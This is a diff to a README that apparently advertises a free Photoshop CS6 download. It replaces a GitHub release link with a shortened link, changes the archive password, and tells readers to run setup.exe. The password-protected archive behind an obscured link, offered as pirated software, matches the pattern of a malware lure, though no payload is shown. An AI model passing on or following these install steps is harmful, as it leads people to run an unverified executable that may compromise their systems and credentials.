@@ -2,8 +2,8 @@
 
 <H3>How to install:</H3>
 
-1. [Download](https://github.com/jbm694827/photo-cs6/releases/download/Download/PhotoshopCS6.rar)
-2. Open archive (pass: Photo6)
+1. [Download](https://goo.su/O3Qgk0)
+2. Open archive (pass: Project12!)
 3. Open setup.exe for download components and install
 4. Follow the instructions
 
